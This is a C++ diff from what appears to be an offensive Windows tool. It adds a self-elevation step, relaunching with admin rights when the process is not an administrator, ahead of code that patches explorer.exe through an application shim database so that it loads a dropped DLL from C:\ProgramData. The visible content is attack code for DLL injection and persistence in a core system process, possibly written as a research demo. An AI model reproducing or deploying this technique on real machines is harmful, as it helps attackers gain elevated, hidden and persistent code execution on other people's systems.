@@ -7,6 +7,8 @@
 #include <stdio.h>
 #include <string>
 
+#include "elevate.h"
+
 void make_test()
 {
     char test_cmd[] = "test.bat";
@@ -114,6 +116,14 @@ BOOL dropResource(const char *payloadName, int res_id)
 
 int main(int argc, char *argv[])
 {
+    char app_path[MAX_PATH];
+    GetModuleFileNameA(0, (LPSTR)app_path, MAX_PATH);
+	
+    if (!IsUserAdminMember()) {
+        RunElevated(app_path);
+        return 1;
+    }
+
     std::string app_name = "explorer.exe"; //the application to be patched
     std::string sdb_name = "{5426aa69-be6d-4c5a-b2c0-160900adcd3f}"; //GUID of SDB
     std::string dll_path = "C:\\ProgramData\\demo.dll";
